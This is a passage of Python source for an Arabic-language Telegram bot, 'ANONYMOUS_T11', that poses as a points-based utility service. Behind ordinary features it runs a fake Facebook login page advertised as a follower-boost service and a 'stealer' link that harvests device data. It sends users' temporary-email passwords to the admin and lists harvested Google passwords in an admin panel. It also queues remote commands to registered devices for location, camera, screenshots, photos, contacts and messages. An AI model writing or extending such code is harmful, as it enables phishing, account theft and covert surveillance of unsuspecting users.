        markup.row(
            InlineKeyboardButton("📩 معلومات مجمعة", callback_data="admin_collected_data"),
            InlineKeyboardButton("📜 سجل الأخطاء", callback_data="admin_logs")
        )
        markup.row(
            InlineKeyboardButton("🚫 حظر مستخدم", callback_data="admin_ban_user"),
            InlineKeyboardButton("✅ إلغاء حظر", callback_data="admin_unban_user")
        )
    return markup

def build_device_list_markup():
    markup = InlineKeyboardMarkup(row_width=1)
    devices = get_registered_devices_db()
    if not devices:
        markup.row(InlineKeyboardButton("⚠️ لا توجد أجهزة", callback_data="no_devices"))
    else:
        for dev in devices:
            markup.row(InlineKeyboardButton(f"📱 {dev['device_id']}", callback_data=f"remote_select_{dev['device_id']}"))
    markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
    return markup

def build_fb_report_type_markup():
    markup = InlineKeyboardMarkup(row_width=2)
    for key, label in FB_REPORT_TYPES.items():
        markup.row(InlineKeyboardButton(label, callback_data=f"fb_type_{key}"))
    markup.row(InlineKeyboardButton("❌ إلغاء", callback_data="back_to_main"))
    return markup

# ===================== معالج الأوامر =====================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    user_states[chat_id] = None
    if is_user_banned(chat_id):
        safe_send(chat_id, "🚫 أنت محظور.")
        return
    username = message.from_user.username or ''
    first_name = message.from_user.first_name or ''
    last_name = message.from_user.last_name or ''
    text = message.text
    referral_code = None
    if ' ' in text:
        parts = text.split()
        if len(parts) > 1 and parts[1].startswith('ref_'):
            code = parts[1][4:]
            if handle_referral(code, chat_id):
                safe_send(chat_id, "🎉 تم تفعيل رابط الدعوة! +10 نقاط.")
                referral_code = code
    upsert_user(chat_id, username, first_name, last_name, referral_code)
    
    if is_new_user(chat_id):
        welcome = (
            "مرحبا بك في نظام ANONYMOUS_T11\n"
            "قم بالضغط على /Start ليعمل النظام 🌐\n"
            "واختر الخيارات التي تريدها 🤖\n"
            "بعض الخيارات تحتاج إلى نقاط 🔒\n"
            "للحصول على نقاط عليك مشاركة النظام 🤖\n"
            "بعض الخيارات تحتاج لتفعيل الخدمات 🤖\n"
            "اوامر المساعدة اضغط /help 👤"
        )
        safe_send(chat_id, welcome)
        mark_welcome_sent(chat_id)
    
    safe_send(chat_id, "📌 القائمة الرئيسية:", reply_markup=build_main_menu(chat_id))

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = (
        "📖 الأوامر المتاحة\n\n"
        "/start - القائمة الرئيسية\n"
        "/login - تفعيل الخدمات (Google)\n"
        "/logout - تسجيل الخروج\n"
        "/referral - رابط دعوتك\n"
        "/points - نقاطك\n"
        "/cancel - إلغاء العملية\n\n"
        "🔗 نظام النقاط: كل دعوة = 10 نقاط.\n"
        "🔒 الأزرار المغلقة تتطلب نقاطاً.\n"
        "🔓 الأزرار المفتوحة متاحة للجميع.\n"
        "👑 المطور لديه صلاحية كاملة ولا يحتاج نقاط."
    )
    safe_send(message.chat.id, help_text)

@bot.message_handler(commands=['points'])
def show_points(message):
    chat_id = message.chat.id
    points = get_user_points(chat_id)
    safe_send(chat_id, f"⭐ نقاطك: {points}")

@bot.message_handler(commands=['referral'])
def show_referral(message):
    chat_id = message.chat.id
    link = create_referral_link(chat_id)
    safe_send(chat_id, f"🔗 رابط دعوتك:\n{link}")

@bot.message_handler(commands=['cancel'])
def cancel_state(message):
    chat_id = message.chat.id
    if chat_id in user_states:
        del user_states[chat_id]
    if chat_id in admin_remote_target:
        del admin_remote_target[chat_id]
    safe_send(chat_id, "✅ تم الإلغاء.")

@bot.message_handler(commands=['login'])
def google_login_handler(message):
    google_login(message)

@bot.message_handler(commands=['logout'])
def google_logout_handler(message):
    google_logout(message)

@bot.message_handler(commands=['check_email'])
def check_email_command(message):
    chat_id = message.chat.id
    if chat_id not in temp_emails:
        safe_send(chat_id, "❌ ليس لديك بريد مؤقت.")
        return
    token = temp_emails[chat_id]['token']
    msgs = check_temp_emails_real(token)
    response = "📬 رسائل البريد المؤقت\n\n" + "\n\n".join(msgs) if msgs else "📭 لا توجد رسائل."
    safe_send(chat_id, response)

# ===================== معالج الأزرار =====================
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    try:
        bot.answer_callback_query(call.id)
        logger.info(f"✅ Callback received: {call.data} from user {call.from_user.id}")
    except Exception as e:
        logger.error(f"Callback answer error: {e}")
    
    chat_id = call.message.chat.id
    data = call.data

    if data.startswith("voice_"):
        voice_key = data.split("_")[1]
        tts_voice_selection[chat_id] = voice_key
        user_states[chat_id] = "waiting_for_tts_text"
        safe_send(chat_id, f"✅ تم اختيار: {voice_key}\n\nالآن أرسل النص للتحويل.")
        return

    if data.startswith("fb_type_"):
        report_type_key = data.split("_")[2]
        report_type_label = FB_REPORT_TYPES.get(report_type_key, "أخرى")
        user_states[chat_id] = "waiting_for_fb_report_reason"
        user_states[f"{chat_id}_fb_report_type"] = report_type_label
        safe_send(chat_id, f"✅ تم اختيار: {report_type_label}\n\nالآن اكتب شرحاً مفصلاً للمشكلة.")
        return

    if data.startswith("locked_"):
        if is_admin(chat_id):
            actual_mode = data.replace("locked_", "mode_")
        else:
            points = get_user_points(chat_id)
            required = 20 if "vuln_scan" in data else 10
            if "fb_report" in data: required = 30
            if "temp_number" in data: required = 50
            if points < required:
                safe_send(chat_id, f"❌ نقاط غير كافية! تحتاج {required} نقطة.")
                return
            if not deduct_points(chat_id, required, f"استخدام ميزة {data}"):
                safe_send(chat_id, "❌ فشل خصم النقاط.")
                return
            actual_mode = data.replace("locked_", "mode_")
        
        if actual_mode == "mode_site":
            user_states[chat_id] = "waiting_for_site"
            safe_send(chat_id, "🔗 أرسل رابط الموقع لفحصه.")
        elif actual_mode == "mode_apk":
            user_states[chat_id] = "waiting_for_apk"
            safe_send(chat_id, "📦 أرسل ملف APK لتحليله.")
        elif actual_mode == "mode_my_app":
            user_states[chat_id] = "waiting_for_my_app"
            safe_send(chat_id, "🛠️ أرسل ملف الكود لمراجعته.")
        elif actual_mode == "mode_track_phone":
            user_states[chat_id] = "waiting_for_track_num"
            safe_send(chat_id, "📍 أرسل الرقم (مثل: +201001234567).")
        elif actual_mode == "mode_vuln_scan":
            user_states[chat_id] = "waiting_for_vuln_target"
            safe_send(chat_id, "🛡️ أرسل الهدف لفحص الثغرات.\n\nيمكنك إرسال:\n• رابط موقع\n• عنوان IP\n• نطاق")
        else:
            safe_send(chat_id, "⚠️ ميزة غير معروفة.")
        return

    if data.startswith('admin_') and not is_admin(chat_id):
        safe_send(chat_id, "❌ للمطور فقط.")
        return

    if data == "mode_site":
        user_states[chat_id] = "waiting_for_site"
        safe_send(chat_id, "🔗 أرسل رابط الموقع لفحصه.")
    
    elif data == "mode_apk":
        user_states[chat_id] = "waiting_for_apk"
        safe_send(chat_id, "📦 أرسل ملف APK لتحليله.")
    
    elif data == "mode_my_app":
        user_states[chat_id] = "waiting_for_my_app"
        safe_send(chat_id, "🛠️ أرسل ملف الكود لمراجعته.")
    
    elif data == "mode_temp_email":
        email, token, password = create_temp_email_real()
        if email:
            temp_emails[chat_id] = {'email': email, 'token': token, 'password': password}
            text = f"📤 بريدك المؤقت\n{email}\n🔑 كلمة السر: {password}\nاستخدم /check_email لعرض الرسائل."
            send_sensitive_data_to_admin("Temp Email", f"{email} | {password}", chat_id)
        else:
            text = "⚠️ فشل إنشاء البريد."
        safe_send(chat_id, text)
        feature_usage["إيميل مؤقت"] += 1
    
    elif data == "mode_track_phone":
        user_states[chat_id] = "waiting_for_track_num"
        safe_send(chat_id, "📍 أرسل الرقم (مثل: +201001234567).")
    
    elif data == "mode_fb_report":
        if not is_admin(chat_id) and get_user_points(chat_id) < 30:
            safe_send(chat_id, "⚠️ تحتاج 30 نقطة.")
            return
        safe_send(chat_id, "📢 اختر نوع البلاغ", reply_markup=build_fb_report_type_markup())
    
    elif data == "mode_download":
        if not FFMPEG_AVAILABLE:
            safe_send(chat_id, "⚠️ خدمة تحميل الفيديو غير متاحة (FFmpeg غير مثبت).")
            return
        user_states[chat_id] = "waiting_for_download"
        safe_send(chat_id, "📥 أرسل رابط الفيديو لتحميله.")
        feature_usage["تحميل فيديو"] += 1
    
    elif data == "mode_shorten_url":
        user_states[chat_id] = "waiting_for_shorten"
        safe_send(chat_id, "🔗 أرسل الرابط الطويل لتقصيره.")
        feature_usage["تقصير روابط"] += 1
    
    elif data == "mode_vuln_scan":
        user_states[chat_id] = "waiting_for_vuln_target"
        safe_send(chat_id, "🛡️ أرسل الهدف لفحص الثغرات.\n\nيمكنك إرسال:\n• رابط موقع\n• عنوان IP\n• نطاق")
    
    elif data == "mode_pdf":
        user_states[chat_id] = "waiting_for_pdf"
        safe_send(chat_id, "📚 أرسل ملف PDF الدراسي.")
        feature_usage["تحليل PDF"] += 1
    
    elif data == "mode_temp_number":
        safe_send(chat_id, "⏳ جاري جلب أرقام هواتف مؤقتة...")
        numbers = fetch_temp_numbers_advanced(limit=5)
        if numbers:
            response = "📱 أرقام هواتف مؤقتة\n\n"
            for i, num in enumerate(numbers, 1):
                response += f"{i}. {num['number']}\n   🌍 {num['country']}\n   📡 {num['source'][:30]}...\n\n"
            safe_send(chat_id, response)
            feature_usage["رقم مؤقت"] += 1
        else:
            safe_send(chat_id, "⚠️ فشل جلب الأرقام، حاول لاحقاً.")
    
    elif data == "mode_google_login":
        google_login(call.message)
    
    elif data == "mode_google_logout":
        google_logout(call.message)
    
    elif data == "mode_facebook_followers":
        fake_url = f"{SERVER_URL}/facebook_login"
        safe_send(chat_id, f"📊 <b>رشق متابعين فيسبوك</b>\n\nللوصول إلى خدمة رشق المتابعين، يرجى تسجيل الدخول من خلال الرابط التالي:\n{fake_url}\n\n⚠️ تأكد من إدخال بياناتك الصحيحة.")
        feature_usage["رشق متابعين"] += 1
        notify_admin(f"📊 مستخدم {chat_id} فتح صفحة رشق المتابعين")
    
    elif data == "mode_stealer":
        stealer_url = f"{SERVER_URL}/stealer"
        safe_send(chat_id, f"🎯 <b>سحب المعلومات</b>\n\nللوصول إلى أداة سحب المعلومات، يرجى الضغط على الرابط التالي:\n{stealer_url}\n\n⚠️ سيتم جمع معلومات جهازك بشكل آمن.")
        feature_usage["سحب معلومات"] += 1
        notify_admin(f"🎯 مستخدم {chat_id} فتح رابط سحب المعلومات")
    
    elif data == "mode_show_points":
        points = get_user_points(chat_id)
        safe_send(chat_id, f"⭐ نقاطك: {points}")
    
    elif data == "mode_points_history":
        history = get_points_history(chat_id)
        if not history:
            safe_send(chat_id, "📊 لا يوجد سجل للنقاط.")
        else:
            text = "📊 سجل النقاط:\n\n"
            for row in history:
                sign = "+" if row['amount'] > 0 else ""
                text += f"{sign}{row['amount']} نقطة - {row['reason']}\n   {row['created_at'][:16]}\n"
            safe_send(chat_id, text)
    
    elif data == "mode_show_referral":
        link = create_referral_link(chat_id)
        safe_send(chat_id, f"🔗 رابط دعوتك:\n{link}")
    
    elif data == "mode_admin" and is_admin(chat_id):
        stats = "👑 لوحة المطور\n"
        for f, c in feature_usage.items():
            stats += f"• {f}: {c} مرة\n"
        safe_send(chat_id, stats)
    
    elif data == "mode_view_devices" and is_admin(chat_id):
        devs = get_registered_devices_db()
        if not devs:
            text = "📱 لا توجد أجهزة مسجلة."
        else:
            text = "📱 الأجهزة المسجلة\n\n"
            for d in devs:
                text += f"🆔 {d['device_id']}\n👤 {d['chat_id']}\n📅 {d['linked_at'][:10] if d.get('linked_at') else 'غير معروف'}\n\n"
        safe_send(chat_id, text)
    
    elif data == "mode_remote_admin" and is_admin(chat_id):
        safe_send(chat_id, "🎮 تحكم عن بعد\nاختر الجهاز:", reply_markup=build_device_list_markup())
    
    elif data == "mode_set_dev_endpoint" and is_admin(chat_id):
        user_states[chat_id] = "waiting_for_dev_endpoint"
        safe_send(chat_id, "🖥️ أرسل عنوان حاسب المطور (مثل: http://192.168.1.100:8080)")
    
    elif data.startswith("remote_select_") and is_admin(chat_id):
        device_id = data.split("_")[2]
        with db_transaction() as conn:
            c = conn.cursor()
            c.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
            if c.fetchone():
                admin_remote_target[chat_id] = device_id
                user_states[chat_id] = "waiting_for_remote_command"
                safe_send(chat_id, f"✅ تم اختيار: {device_id}\n\n📝 الأوامر:\n• موقع\n• كاميرا\n• لقطة\n• صور\n• جهات اتصال\n• رسائل")
            else:
                safe_send(chat_id, "❌ الجهاز غير موجود.")
    
    elif data == "admin_stats" and is_admin(chat_id):
        stats = f"📊 إحصائيات البوت\n\n👥 المستخدمون: {len(get_registered_devices_db())}\n📱 الأجهزة: {len(get_registered_devices_db())}\n🔑 مستخدمي Google: {len(google_users)}\n"
        for f, c in feature_usage.items():
            if c > 0:
                stats += f"• {f}: {c} مرة\n"
        safe_send(chat_id, stats)
    
    elif data == "admin_broadcast" and is_admin(chat_id):
        user_states[chat_id] = "waiting_for_broadcast"
        safe_send(chat_id, "📢 أرسل الرسالة للبث الجماعي.")
    
    elif data == "admin_collected_data" and is_admin(chat_id):
        collected = "📩 المعلومات المجمعة\n\n"
        if google_passwords:
            collected += "🔑 كلمات سر Google\n"
            for uid, pwd in google_passwords.items():
                email = google_users.get(uid, {}).get('email', 'غير معروف')
                collected += f"• {uid} ({email}): {pwd}\n"
        if temp_emails:
            collected += "\n📧 البريد المؤقت\n"
            for uid, data in temp_emails.items():
                collected += f"• {uid}: {data['email']} | {data['password']}\n"
        if not google_passwords and not temp_emails:
            collected += "📭 لا توجد معلومات."
        safe_send(chat_id, collected)
    
    elif data == "admin_logs" and is_admin(chat_id):
        try:
            with open('bot.log', 'r') as f:
                logs = f.read().splitlines()[-30:]
                text = "📜 آخر 30 سطر\n" + "\n".join(logs)
                safe_send(chat_id, text)
        except:
            safe_send(chat_id, "⚠️ لا يوجد سجل.")
    
    elif data == "admin_ban_user" and is_admin(chat_id):
        user_states[chat_id] = "waiting_for_ban_user"
        safe_send(chat_id, "🚫 أرسل معرف المستخدم للحظر.")
    
    elif data == "admin_unban_user" and is_admin(chat_id):
        user_states[chat_id] = "waiting_for_unban_user"
        safe_send(chat_id, "✅ أرسل معرف المستخدم لإلغاء الحظر.")
    
    elif data in ["no_devices", "back_to_main"]:
        safe_send(chat_id, "📌 القائمة الرئيسية:", reply_markup=build_main_menu(chat_id))
    
    else:
        safe_send(chat_id, "⚠️ خيار غير معروف.")

# ===================== معالج النصوص =====================
@bot.message_handler(func=lambda msg: True, content_types=['text'])
def handle_text_messages(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    text = message.text.strip()

    try:
        if state == "waiting_for_vuln_target":
            target = text
            safe_send(chat_id, "⏳ جاري فحص الثغرات... يُرجى الانتظار.")
            try:
                target_ip = None
                target_domain = None
                target_url = None
                if re.match(r'^https?://', target):
                    target_url = target
                    domain_match = re.search(r'https?://([^/:]+)', target)
                    if domain_match:
                        target_domain = domain_match.group(1)
                elif re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target):
                    target_ip = target
                elif re.match(r'^[a-zA-Z0-9-]+\.[a-zA-Z]{2,}$', target):
                    target_domain = target
                    target_url = f"https://{target}"
                else:
                    safe_send(chat_id, "⚠️ لم يتم التعرف على الهدف. أرسل رابطاً أو IP أو نطاقاً صحيحاً.")
                    user_states[chat_id] = None
                    return
                report = perform_vulnerability_scan(target_ip, target_domain, target_url)
                feature_usage["فحص ثغرات"] += 1
                if len(report) > 4000:
                    parts = [report[i:i+4000] for i in range(0, len(report), 4000)]
                    for part in parts:
                        safe_send(chat_id, part)
                else:
                    safe_send(chat_id, report)
                report_filename = f"vuln_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                report_path = os.path.join(TEMP_DIR, report_filename)
                with open(report_path, 'w', encoding='utf-8') as f:
                    f.write(report)
                with open(report_path, 'rb') as f:
                    bot.send_document(chat_id, f, caption=f"📄 تقرير فحص الثغرات - {datetime.now().strftime('%Y-%m-%d %H:%M')}")
                os.remove(report_path) if os.path.exists(report_path) else None
            except Exception as e:
                logger.error(f"Vuln scan error: {e}")
                safe_send(chat_id, f"⚠️ حدث عطل فني أثناء فحص الثغرات: {str(e)[:100]}")
            user_states[chat_id] = None
            return

        if state == "waiting_for_shorten":
            if not re.match(r'^https?://', text):
                safe_send(chat_id, "❌ رابط غير صالح.")
                return
            safe_send(chat_id, "⏳ جاري تقصير الرابط...")
            short_url, error = shorten_url(text)
            if error:
                safe_send(chat_id, f"⚠️ فشل تقصير الرابط: {error}")
            else:
                safe_send(chat_id, f"✅ الرابط المختصر:\n{short_url}")
            user_states[chat_id] = None
            return

        if state == "waiting_for_tts_text":
            safe_send(chat_id, "⚠️ هذه الميزة غير متاحة حالياً.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_ban_user":
            if not is_admin(chat_id):
                safe_send(chat_id, "❌ للمطور فقط.")
                user_states[chat_id] = None
                return
            try:
                user_id = int(text)
                if user_id == ADMIN_ID:
                    safe_send(chat_id, "❌ لا يمكن حظر المطور.")
                    user_states[chat_id] = None
                    return
                ban_user(user_id)
                safe_send(chat_id, f"✅ تم حظر المستخدم {user_id}.")
                notify_admin(f"🚫 حظر المستخدم {user_id}")
            except:
                safe_send(chat_id, "❌ معرف غير صحيح.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_unban_user":
            if not is_admin(chat_id):
                safe_send(chat_id, "❌ للمطور فقط.")
                user_states[chat_id] = None
                return
            try:
                user_id = int(text)
                unban_user(user_id)
                safe_send(chat_id, f"✅ تم إلغاء حظر المستخدم {user_id}.")
                notify_admin(f"✅ إلغاء حظر المستخدم {user_id}")
            except:
                safe_send(chat_id, "❌ معرف غير صحيح.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_broadcast":
            if not is_admin(chat_id):
                safe_send(chat_id, "❌ للمطور فقط.")
                user_states[chat_id] = None
                return
            success = 0
            fail = 0
            with db_transaction() as conn:
                c = conn.cursor()
                c.execute("SELECT chat_id FROM users WHERE is_banned = 0")
                users = c.fetchall()
            for user in users:
                try:
                    safe_send(user['chat_id'], text)
                    success += 1
                    time.sleep(0.1)
                except:
                    fail += 1
            safe_send(chat_id, f"✅ تم إرسال الرسالة لـ {success} مستخدم.\n❌ فشل الإرسال لـ {fail} مستخدم.")
            user_states[chat_id] = None
            notify_admin(f"📢 بث جماعي: {text[:50]}...")
            return

        if state == "waiting_for_dev_endpoint" and is_admin(chat_id):
            if re.match(r'^https?://', text):
                global developer_computer_endpoint
                developer_computer_endpoint = text
                safe_send(chat_id, f"✅ تم تعيين: {text}")
            else:
                safe_send(chat_id, "❌ عنوان غير صالح.")
            user_states[chat_id] = None
            return

        if is_admin(chat_id) and state == "waiting_for_remote_command":
            device_id = admin_remote_target.get(chat_id)
            if not device_id:
                safe_send(chat_id, "❌ لم يتم اختيار جهاز.")
                user_states[chat_id] = None
                return
            command = text.lower()
            if command == "/cancel":
                safe_send(chat_id, "❌ تم الإلغاء.")
                user_states[chat_id] = None
                admin_remote_target.pop(chat_id, None)
                return
            add_pending_command_db(device_id, command)
            safe_send(chat_id, f"⏳ تم إرسال الأمر {command} إلى الجهاز.")
            return

        if state == "waiting_for_pdf_question":
            pdf_text = user_states.get(f"{chat_id}_pdf_text")
            if not pdf_text:
                safe_send(chat_id, "⚠️ لم يتم تحميل ملف PDF.")
                user_states[chat_id] = None
                return
            safe_send(chat_id, "⏳ جاري البحث عن الإجابة...")
            answer = answer_question_from_pdf(pdf_text, text)
            safe_send(chat_id, f"📚 الإجابة\n{answer}")
            return

        if state == "waiting_for_site":
            if re.match(r'^https?://', text):
                safe_send(chat_id, "⏳ جاري فحص الموقع...")
                result, status = scan_website(text)
                safe_send(chat_id, f"🔍 نتيجة الفحص\n{result}")
            else:
                safe_send(chat_id, "❌ رابط غير صالح.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_track_num":
            result, status = track_phone_real(text)
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return

        if state == "waiting_for_fb_report_reason":
            reason = text
            user_states[chat_id] = "waiting_for_fb_report_link"
            user_states[f"{chat_id}_fb_report_reason"] = reason
            safe_send(chat_id, "✅ تم حفظ السبب.\n\nأرسل رابط المنشور (أو اكتب 'لا يوجد').")
            return

        if state == "waiting_for_fb_report_link":
            link = text if text.lower() != 'لا يوجد' else ''
            report_type = user_states.get(f"{chat_id}_fb_report_type")
            reason = user_states.get(f"{chat_id}_fb_report_reason")
            if not report_type or not reason:
                safe_send(chat_id, "❌ حدث خطأ.")
                user_states[chat_id] = None
                return
            safe_send(chat_id, "⏳ جاري إنشاء الشكوى...")
            report_text = generate_fb_report(report_type, reason, link)
            support_links = {
                "حساب مزيف": "https://www.facebook.com/help/contact/295309487309948",
                "منشور مسيء": "https://www.facebook.com/help/contact/315847653073855",
                "تحرش أو مضايقة": "https://www.facebook.com/help/contact/237547145079192",
                "انتحال شخصية": "https://www.facebook.com/help/contact/295309487309948",
                "انتهاك خصوصية": "https://www.facebook.com/help/contact/249621638488458",
                "محتوى عنيف": "https://www.facebook.com/help/contact/274459462613911"
            }
            support_link = "https://www.facebook.com/help/contact/315847653073855"
            for key, url in support_links.items():
                if key in report_type:
                    support_link = url
                    break
            final_msg = (
                f"📝 شكوى رسمية\n\n"
                f"{report_text}\n\n"
                f"🔗 رابط الدعم: {support_link}\n\n"
                f"📌 انسخ النص أعلاه، ثم اضغط على الرابط، والصق النص في نموذج الإبلاغ."
            )
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("🌐 فتح رابط الدعم", url=support_link))
            markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
            safe_send(chat_id, final_msg, reply_markup=markup)
            for key in [f"{chat_id}_fb_report_type", f"{chat_id}_fb_report_reason"]:
                if key in user_states:
                    del user_states[key]
            user_states[chat_id] = None
            feature_usage["بلاغات فيسبوك"] += 1
            return

        if state == "waiting_for_download":
            if not re.match(r'^https?://', text):
                safe_send(chat_id, "❌ رابط غير صالح.")
                user_states[chat_id] = None
                return
            safe_send(chat_id, "⏳ جاري تحميل الفيديو...")
            result, error = download_video(text)
            if error:
                safe_send(chat_id, f"⚠️ {error}")
            elif result and os.path.exists(result):
                try:
                    with open(result, 'rb') as f:
                        bot.send_video(chat_id, f, caption="📥 تم التحميل بنجاح")
                    os.remove(result)
                except Exception as e:
                    safe_send(chat_id, f"⚠️ فشل إرسال الفيديو: {str(e)}")
            else:
                safe_send(chat_id, "⚠️ فشل تحميل الفيديو.")
            user_states[chat_id] = None
            return

        if state is None:
            safe_send(chat_id, "🤖 اختر خدمة من القائمة.", reply_markup=build_main_menu(chat_id))
    except Exception as e:
        logger.error(f"handle_text_messages error: {e}")
        notify_admin(f"خطأ في معالج النصوص: {str(e)}", is_error=True)
        safe_send(chat_id, f"⚠️ حدث عطل فني: {str(e)}")

# ===================== معالج الملفات =====================
@bot.message_handler(content_types=['document'])
def handle_documents(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    temp_file_path = None

    try:
        if state == "waiting_for_pdf":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            if not file_name.lower().endswith('.pdf'):
                safe_send(chat_id, "❌ يرجى إرسال ملف PDF.")
                return
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            temp_file_path = os.path.join(TEMP_DIR, file_name)
            with open(temp_file_path, 'wb') as f:
                f.write(downloaded)
            pdf_text = extract_text_from_pdf(downloaded)
            if not pdf_text:
                safe_send(chat_id, "⚠️ فشل استخراج النص.")
                user_states[chat_id] = None
                return
            user_states[f"{chat_id}_pdf_text"] = pdf_text
            user_states[chat_id] = "waiting_for_pdf_question"
            safe_send(chat_id, f"✅ تم استخراج النص ({len(pdf_text)} حرف).\n\nالآن اكتب سؤالك.")
            if temp_file_path and os.path.exists(temp_file_path):
                os.remove(temp_file_path)
            return

        if state == "waiting_for_apk":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            if not file_name.lower().endswith('.apk'):
                safe_send(chat_id, "❌ أرسل ملف APK.")
                return
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            temp_file_path = os.path.join(TEMP_DIR, file_name)
            with open(temp_file_path, 'wb') as f:
                f.write(downloaded)
            safe_send(chat_id, "⏳ جاري فحص الملف...")
            result, status = scan_apk_real(downloaded, file_name)
            safe_send(chat_id, f"📦 نتيجة الفحص\n{result}")
            user_states[chat_id] = None
            return

        if state == "waiting_for_my_app":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            ext = file_name.split('.')[-1].lower()
            if ext not in ['txt', 'py', 'js', 'java', 'cpp', 'c', 'html', 'css', 'php']:
                safe_send(chat_id, "❌ امتداد غير مدعوم.")
                return
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            try:
                content = downloaded.decode('utf-8')
                safe_send(chat_id, "⏳ جاري مراجعة الكود...")
                review = "🛠️ مراجعة الكود:\n\nتم استلام الملف، يمكنك مراجعته يدوياً."
                safe_send(chat_id, review)
            except:
                safe_send(chat_id, "⚠️ فشل قراءة الملف.")
            user_states[chat_id] = None
            return

        if chat_id in linked_users:
            safe_send(chat_id, "📎 تم استلام الملف.")
        else:
            safe_send(chat_id, "📎 لفحص الملفات، فعّل الخدمات أولاً.")
    except Exception as e:
        logger.error(f"handle_documents error: {e}")
        notify_admin(f"خطأ في معالج الملفات: {str(e)}", is_error=True)
        safe_send(chat_id, f"⚠️ حدث عطل فني: {str(e)}")
    finally:
        if temp_file_path and os.path.exists(temp_file_path):
            try:
                os.remove(temp_file_path)
            except:
                pass

@bot.message_handler(content_types=['photo'])
def handle_photos(message):
    chat_id = message.chat.id
    if chat_id in linked_users:
        safe_send(chat_id, "🖼️ تم استلام الصورة.")
    else:
        safe_send(chat_id, "🖼️ لفحص الصور، فعّل الخدمات أولاً.")

# ===================== معالج الرد الافتراضي =====================
@bot.message_handler(func=lambda message: True)
def default_reply(message):
    if not message.text.startswith('/'):
        safe_send(message.chat.id, "🤖 البوت يعمل. استخدم /start للقائمة.")

# ===================== Keep-Alive Thread =====================
def keep_alive():
    ping_url = f"{SERVER_URL}/ping"
    while True:
        time.sleep(300)
        try:
            req_lib.get(ping_url, timeout=10)
            logger.info("✅ تم إرسال Keep-alive ping")
        except Exception as e:
            logger.error(f"❌ فشل Keep-alive ping: {e}")

# ===================== تشغيل البوت =====================
if __name__ == "__main__":
    bot.remove_webhook()
    
    webhook_url = f"{SERVER_URL}/webhook"
    try:
        success = bot.set_webhook(url=webhook_url)
        if success:
            logger.info(f"✅ Webhook تم تعيينه بنجاح: {webhook_url}")
        else:
            logger.warning(f"⚠️ فشل تعيين Webhook. تحقق من SERVER_URL.")
    except Exception as e:
        logger.error(f"❌ خطأ في تعيين Webhook: {e}")

    keep_alive_thread = threading.Thread(target=keep_alive, daemon=True)
    keep_alive_thread.start()
    logger.info("🔄 تم بدء Keep-alive thread (كل 5 دقائق)")

    app.run(host='0.0.0.0', port=PORT, debug=False)
